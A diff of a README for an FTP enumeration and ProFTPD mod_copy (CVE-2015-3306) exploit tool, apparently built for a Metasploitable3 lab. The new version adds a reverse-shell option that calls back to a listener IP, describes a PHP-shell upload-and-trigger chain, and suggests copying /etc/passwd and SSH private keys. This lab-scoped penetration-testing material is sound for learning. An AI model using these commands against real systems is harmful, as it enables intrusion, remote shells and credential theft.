@@ -1,8 +1,7 @@
-# Mbunga FTP v0.2
+# Mbunga FTP v0.3
 
-FTP enumeration/fingerprinting + ProFTPD mod_copy exploit (CVE-2015-3306)
-for the authorized Metasploitable3 lab, implemented directly with Python
-sockets. It does not invoke Metasploit or Nmap.
+FTP enumeration + ProFTPD mod_copy exploitation for the authorized
+Metasploitable3 lab. Pure Python sockets - no Metasploit, no Nmap.
 
 ## Install
 ```bash
@@ -11,27 +10,26 @@ source .venv/bin/activate
 pip install -e .
 ```
 
-## Test
+## Enumerate
 ```bash
 mbunga-ftp 192.168.0.48
 mbunga-ftp 192.168.0.48 --json ftp-result.json
 ```
 
-## Exploit (Metasploitable3 / ProFTPD 1.3.5)
+## Exploit check / file copy PoC (CVE-2015-3306)
 ```bash
 mbunga-ftp 192.168.0.48 --exploit
 mbunga-ftp 192.168.0.48 --exploit --src /etc/passwd --dst /tmp/mbunga-proof.txt
 ```
 
-The exploit module:
-1. Fingerprint: banner must be ProFTPD 1.3.5.
-2. Non-destructive probe: `SITE CPFR /etc/passwd` must return 350
-   (mod_copy present and unpatched).
-3. PoC: `SITE CPFR <src>` + `SITE CPTO <dst>` -> arbitrary file copy
-   on the server (CVE-2015-3306).
+## Reverse shell (PHP via webroot)
+```bash
+mbunga-ftp 192.168.0.48 --shell 192.168.0.10 --lport 4444
+```
 
-Lab escalation ideas: copy an SSH private key into the anonymous FTP
-directory and RETR it, or drop a PHP shell into the webroot.
+Chain: anonymous STOR of a PHP reverse shell -> SITE CPFR/CPTO copies it
+into /var/www/html -> HTTP GET triggers it -> listener on LPORT catches
+the shell. Options: --webroot, --http-port, --user, --passwd.
 
-Current scope: banner, SYST, FEAT, HELP, product/version fingerprinting,
-JSON output, and the mod_copy exploit PoC.
+Escalation ideas: copy an SSH key into the anonymous FTP dir and RETR it,
+or drop a PHP shell into the webroot.
